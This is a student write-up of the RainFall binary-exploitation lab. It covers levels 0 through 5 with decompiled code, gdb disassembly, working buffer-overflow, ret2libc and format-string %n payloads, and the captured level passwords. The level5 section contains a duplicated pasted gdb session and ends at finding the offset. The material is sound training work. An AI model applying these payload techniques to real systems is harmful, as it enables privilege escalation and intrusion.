## REINFALL

1. after connecting to the target level0/level0

```bash
ssh level0@<target_ip> -p 4242
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.14.59.34:4242
level0@10.14.59.34's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level0
level0@RainFall:~$ ls
level0
level0@RainFall:~$ 
```

we have tehe file level0 to reverse

```
undefined4 main(undefined4 param_1,int param_2)

{
  int i;
  char *str;
  undefined4 local_1c;
  __uid_t local_18;
  __gid_t local_14;
  
  i = atoi(*(char **)(param_2 + 4));
  if (i == 0x1a7) {
    str = strdup("/bin/sh");
    local_1c = 0;
    local_14 = getegid();
    local_18 = geteuid();
    setresgid(local_14,local_14,local_14);
    setresuid(local_18,local_18,local_18);
    execv("/bin/sh",&str);
  }
  else {
    fwrite("No !\n",1,5,(FILE *)stderr);
  }
  return 0;
}
 
```

the program convert the argv to int and skip 4 bytes to fall into argv\[1\] "skip the binary ./level0"

then conpaire with 0x1a7 => 423  to run the "/bin/sh"

```bahs
level0@RainFall:~$ ./level0 423
$ cd ../level1
$ cat .pass*
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
$ 
```

1. here we go the password to the next level ssh to level1 we found:

```bash
level1@RainFall:~$ ls
level1
level1@RainFall:~$ 
```

ghidra shows :

```bash
void main(void)
{
char local_50 [76];

gets(local_50);
return;
}
```

the programe expect a 76 length char input using gets then return there is a function in the programe named run () at 08048444:

```bash
08048444    int32_t run()

0804846d        fwrite(buf: "Good... Wait what?\n", size: 1, count: 0x13, fp: stdout)
0804847f        return system(line: "/bin/sh")
```

it return  return system(line: "/bin/sh") we got to run is

\-> overflow fill the buffer + the run adress  and pass command that hand on the /bin/sh sense it return it :

```bash
level1@RainFall:~$ (python -c "print('A'*76 + '\x44\x84\x04\x08')"; cat) | ./level1 
Good... Wait what?
cd ..
cd level2
cat .pas*       
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

here is the next level code :

53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77

1. **return address integrity check**

   0xb7f8cc58  system

   0xb7f74a67 /bin/sh

   0xb7f74a64 exit

   0xb7e6b060 system

   0x0804853e ret

   (python -c "print('A'*80 + '\\x3e\\x85\\x04\\x08' + '\\x60\\xb0\\xe6\\xb7' + '\\xe0\\xeb\\xe5\\xb7' + '\\x58\\xcc\\xf8\\xb7')"; cat) | ./level2

   or we may use tge array reverse  
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
2. global variable oferite

   ```bash
   void v(void)
   
   {
     char local_20c [520];
     
     fgets(local_20c,0x200,stdin);
     printf(local_20c); unsafe, no format string!
     if (m == 0x40) {
       fwrite("Wait what?!\n",1,0xc,stdout);
       system("/bin/sh");
     }
     return;
   }
   ```

the allocated buffer is 520 + 4 = Offset to return address

we want to overide the m with 64 not hijacking EIP

from the gdb we have

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x218,%esp
   0x080484ad <+9>:     mov    0x8049860,%eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp)
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp)
   0x080484be <+26>:    lea    -0x208(%ebp),%eax
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   0x080484d2 <+46>:    mov    %eax,(%esp)
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    0x804988c,%eax
   0x080484df <+59>:    cmp    $0x40,%eax
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    0x8049880,%eax
   0x080484e9 <+69>:    mov    %eax,%edx
   0x080484eb <+71>:    mov    $0x8048600,%eax
   0x080484f0 <+76>:    mov    %edx,0xc(%esp)
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp)
   0x080484fc <+88>:    movl   $0x1,0x4(%esp)
   0x08048504 <+96>:    mov    %eax,(%esp)
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   movl   $0x804860d,(%esp)
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.
(gdb) x/s 0x8049860
0x8049860 <stdin@@GLIBC_2.0>:    ""
(gdb) x/s 0x804988c
0x804988c <m>:   ""
(gdb) 
```

Address of `m` = `0x804988c`

The `fgets()` copies the input to a local buffer of 0x208 bytes.

That buffer is passed directly to `printf()`

```
         |→ we fully control `printf(input)`.
```

So we can Include **addresses** in the input

Use format specifiers like `%<n>$n` to write to those addresses

lets find the right ofset :

```bash
for i in $(seq 1 50); do
    python -c "print('\x8c\x98\x04\x08' + '%${i}\$p')" | ./level3
done
```

making a shell to Find the position of our input on the stack

```bash

level3@RainFall:~$ for i in $(seq 1 50); do
>   python -c "print('\x8c\x98\x04\x08' + '%${i}\$p')" | ./level3
> done
�0x200
�0xb7fd1ac0
�0xb7ff37d0
�0x804988c  <- the on we looking for at position 4 
�0x70243525
�0xa
�0xb7fef305
�0xbffff5b8
�0xb7fde2d4
�0xb7fde334
�0x7
�(nil)
�0xb7fde000
�0xb7fff53c
�0xbffff5b8
�0x40
�0xb80
�(nil)
�0xb7fde714
�0x98
�0xb
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
�0xb7fe765d
�0xb7e3ebaf
�0x80482bb
�(nil)
�(nil)
�(nil)
�0xb7fe749f
�0xb7fd5000
�0x2
�0x8048268
�0xb7fffc00
�0xb7ffeff4
�0xb7ffeff4
�0xb7e2fc30
�0x1
�0xb7fdcb18
�0xb7fe7cac
�(nil)
�(nil)
�(nil)
�(nil)
�(nil)
```

the payload

```bash
level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '%60c' + '%4\$n')" | ./level3
�                                                           
Wait what?!
```

let hang the program to cat the pass word or something else ;

```bash
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%60c' + '%4\$n')"; cat) | ./level3
�                                                           
Wait what?!
ls
ls: cannot open directory .: Permission denied
cd ../level4
cat .pass       
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

the token is

b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa

1. level4 exploit

   ```bahs
   ssh level4@<ip>
    System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
   RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
   No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level4/level4
   level4@RainFall:~$ 
   ```

by ghidra we have :

the main call n function 

```
void main(void)

{
  n();
  return;
}
```

which call p function 

```
void n(void)

{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 0x1025544) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}



void p(char *param_1)

{
  printf(param_1);
  return;
}
```

the p function print the param_1 which is the local_20c a buffer of 520 byt 

wee need to get to the m variable globale variable which must be 16930116 to get the seystem executed 

```
### GDB Disassembly with Comments for level4 ###

# Function: main
0x080484a7 <+0>:    push   %ebp                  # Prologue
0x080484a8 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x080484aa <+3>:    and    $0xfffffff0,%esp      # Align stack to 16 bytes
0x080484ad <+6>:    call   0x8048457 <n>         # Call function n()
0x080484b2 <+11>:   leave                         # Epilogue
0x080484b3 <+12>:   ret                           # Return from main

# Function: n
0x08048457 <+0>:    push   %ebp                  # Prologue
0x08048458 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x0804845a <+3>:    sub    $0x218,%esp           # Allocate 536 bytes on stack for buffer
0x08048460 <+9>:    mov    0x8049804,%eax        # Load stdin (FILE*) into eax
0x08048465 <+14>:   mov    %eax,0x8(%esp)        # 3rd arg of fgets: FILE*
0x08048469 <+18>:   movl   $0x200,0x4(%esp)       # 2nd arg of fgets: size 512
0x08048471 <+26>:   lea    -0x208(%ebp),%eax      # Buffer address
0x08048477 <+32>:   mov    %eax,(%esp)            # 1st arg of fgets: buffer
0x0804847a <+35>:   call   0x8048350 <fgets@plt>  # Call fgets(buf, 512, stdin)

0x0804847f <+40>:   lea    -0x208(%ebp),%eax      # Load buffer again
0x08048485 <+46>:   mov    %eax,(%esp)            # Push buffer as arg
0x08048488 <+49>:   call   0x8048444 <p>          # Call p(buffer)

0x0804848d <+54>:   mov    0x8049810,%eax        # Load global var m into eax
0x08048492 <+59>:   cmp    $0x1025544,%eax       # Check if m == 0x1025544
0x08048497 <+64>:   jne    0x80484a5 <n+78>       # If not equal, skip next part
0x08048499 <+66>:   movl   $0x8048590,(%esp)      # Push "/bin/cat .../.pass" string
0x080484a0 <+73>:   call   0x8048360 <system@plt> # system("/bin/cat ...")
0x080484a5 <+78>:   leave                         # Epilogue
0x080484a6 <+79>:   ret                           # Return from n

# Function: p
0x08048444 <+0>:    push   %ebp                  # Prologue
0x08048445 <+1>:    mov    %esp,%ebp             # Setup stack frame
0x08048447 <+3>:    sub    $0x18,%esp            # Allocate 24 bytes on stack
0x0804844a <+6>:    mov    0x8(%ebp),%eax         # Load argument (char *str)
0x0804844d <+9>:    mov    %eax,(%esp)            # Push str to stack
0x08048450 <+12>:   call   0x8048340 <printf@plt> # printf(str)
0x08048455 <+17>:   leave                         # Epilogue
0x08048456 <+18>:   ret                           # Return from p
```

we are at **Format string attack** vulnerability we need to manipulate the printf to write to the m variable  "m == 0x1025544" // 16930112 in decimal 

what we can use :

| **Specifier** | **Meaning**                  | **Use in Exploits**                    |
|:----------|:-------------------------|:-----------------------------------|
| `%d`        | Signed decimal integer   | Leak stack/heap values             |
| `%u`        | Unsigned decimal integer | Leak memory addresses              |
| `%x`        | Hexadecimal (lowercase)  | Leak memory (common in exploits)   |
| `%X`        | Hexadecimal (uppercase)  | Same as `%x`                         |
| `%p`        | Pointer address          | Leak absolute addresses (critical) |
| `%s`        | String                   | Crash if invalid pointer (DoS)     |
| `%c`        | Character                | Rarely useful in exploits          |
| `%f`        | Floating-point           | Rarely useful                      |

here is link to find out more

<https://owasp.org/www-community/attacks/Format_string_attack>

lets test for format string vulnerability and define the offset:

```bash
python -c 'print("AAAA" + "%p "*20)' | ./level4
AAAA0xb7ff26b0 0xbffff794 0xb7fd0ff4 (nil) (nil) 0xbffff758 0x804848d 0xbffff550 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
```

the 0x41414141 located at the 12th position lets conferm it :

```bash
level4@RainFall:~$ python -c 'print("AAAA" + "%12$p")' | ./level4
AAAA0x41414141
```

lets use `%n` format specifier to write the number of bytes 

Craft:

```bash
python -c 'print("\x10\x98\x04\x08" + "%16930112x%12$n")' | ./level4
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

here is the cat .pass trigger 

### level 5

we have this : 

```bash
level5@RainFall:~$ ls
level5
level5@RainFall:~$ ./level5 
adcd
adcd
level5@RainFall:~$ gdb -q ./level5 
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048507
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n> # call function n 
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n 
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp # 512 bytes to read via fgets
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)level5@RainFall:~$ gdb -q ./level5 
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x8048507
(gdb) disas main
Dump of assembler code for function main:
   0x08048504 <+0>:	push   %ebp
   0x08048505 <+1>:	mov    %esp,%ebp
   0x08048507 <+3>:	and    $0xfffffff0,%esp
   0x0804850a <+6>:	call   0x80484c2 <n> # call function n 
   0x0804850f <+11>:	leave  
   0x08048510 <+12>:	ret    
End of assembler dump.
(gdb) disas n 
Dump of assembler code for function n:
   0x080484c2 <+0>:	push   %ebp
   0x080484c3 <+1>:	mov    %esp,%ebp
   0x080484c5 <+3>:	sub    $0x218,%esp # 512 bytes to read via fgets
   0x080484cb <+9>:	mov    0x8049848,%eax
   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:	mov    %eax,(%esp)
   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:	mov    %eax,(%esp)
   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
   0x080484f8 <+54>:	movl   $0x1,(%esp)
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.

int this case we have no global variable to overwrite or something like 




(gdb) b system 
Breakpoint 2 at 0x80483b0
(gdb) find system,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
lets  check the exit :



level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
the offset:



 python -c 'print("AAAA" + "%p "*20)' | ./level5 
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa
   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
End of assembler dump.
```

int this case we have no global variable to overwrite or something like 

```bash
(gdb) b system 
Breakpoint 2 at 0x80483b0
(gdb) find system,+999999999,"/bin/sh"
0xb7f8cc58
warning: Unable to access target memory at 0xb7fd3160, halting search.
```

lets  check the exit :

```bash
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

the offset:

```bash
 python -c 'print("AAAA" + "%p "*20)' | ./level5 
AAAA0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0xa
```